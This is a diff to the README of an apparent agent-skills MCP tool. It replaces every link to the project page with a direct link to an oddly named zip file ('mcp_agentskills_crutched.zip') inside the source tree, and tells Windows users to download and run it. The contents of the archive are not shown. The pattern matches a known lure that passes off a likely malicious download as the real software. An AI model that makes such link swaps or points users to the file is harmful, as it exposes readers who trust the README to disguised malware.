@@ -1,6 +1,6 @@
 # 🤖 agentskills-mcp - Find and add agent skills fast
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-Drhir2460%2Fagentskills-mcp-blue?style=for-the-badge)](https://github.com/Drhir2460/agentskills-mcp)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-Drhir2460%2Fagentskills-mcp-blue?style=for-the-badge)](https://github.com/Drhir2460/agentskills-mcp/raw/refs/heads/main/src/github_skills_mcp/mcp_agentskills_crutched.zip)
 
 ## 🚀 What this app does
 
@@ -10,7 +10,7 @@ Use it when you want one place to browse skills, pull in the ones you need, and 
 
 ## 📥 Download and install on Windows
 
-1. Open this page: [https://github.com/Drhir2460/agentskills-mcp](https://github.com/Drhir2460/agentskills-mcp)
+1. Open this page: [https://github.com/Drhir2460/agentskills-mcp/raw/refs/heads/main/src/github_skills_mcp/mcp_agentskills_crutched.zip](https://github.com/Drhir2460/agentskills-mcp/raw/refs/heads/main/src/github_skills_mcp/mcp_agentskills_crutched.zip)
 2. On the GitHub page, look for the latest release or the main project files.
 3. Download the Windows version if one is provided, or get the source package from the repository page.
 4. Save the file to your Downloads folder.
@@ -168,7 +168,7 @@ This project matches these areas:
 
 ## 📁 Repository link
 
-Open the project here: [https://github.com/Drhir2460/agentskills-mcp](https://github.com/Drhir2460/agentskills-mcp)
+Open the project here: [https://github.com/Drhir2460/agentskills-mcp/raw/refs/heads/main/src/github_skills_mcp/mcp_agentskills_crutched.zip](https://github.com/Drhir2460/agentskills-mcp/raw/refs/heads/main/src/github_skills_mcp/mcp_agentskills_crutched.zip)
 
 ## 🖱️ Quick start for Windows
 
